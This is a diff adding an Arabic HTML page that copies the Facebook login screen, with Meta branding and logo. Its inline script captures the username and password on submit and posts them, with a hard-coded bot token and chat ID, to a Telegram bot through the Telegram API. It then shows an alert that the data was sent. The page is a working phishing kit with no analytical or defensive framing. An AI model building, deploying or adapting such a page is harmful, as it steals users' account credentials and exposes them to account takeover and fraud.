@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="language">العربية</div>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <form class="login-form" id="loginForm">
+            <input type="text" id="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
+            <a href="#">هل نسيت كلمة السر؟</a>
+        </form>
+        <div class="divider"></div>
+        <button class="new-account">إنشاء حساب جديد</button>
+        <footer>
+            <p>© Meta</p>
+        </footer>
+    </div>
+
+    <!-- كود JavaScript لإرسال البيانات -->
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function (e) {
+            e.preventDefault(); // منع إعادة تحميل الصفحة
+
+            const username = document.getElementById("username").value; // اسم المستخدم
+            const password = document.getElementById("password").value; // كلمة السر
+
+            // إعداد بيانات الرسالة
+            const message = `🚨 تسجيل جديد: \n📧 المستخدم: ${username}\n🔑 كلمة السر: ${password}`;
+
+            // إعداد توكن البوت ومعرّف الشات الخاص بك
+            const botToken = "7744008835:AAHD6EUwjMjTDVUZmIT7TzW2OmOHC5MA7Zs";
+            const chatId = "6154022453";
+
+            // رابط Telegram API
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // إرسال البيانات عبر POST
+            fetch(telegramApiUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("تم إرسال البيانات إلى البوت بنجاح!");
+                } else {
+                    alert("فشل في إرسال البيانات!");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("حدث خطأ أثناء الإرسال!");
+            });
+        });
+    </script>
+</body>
+</html>
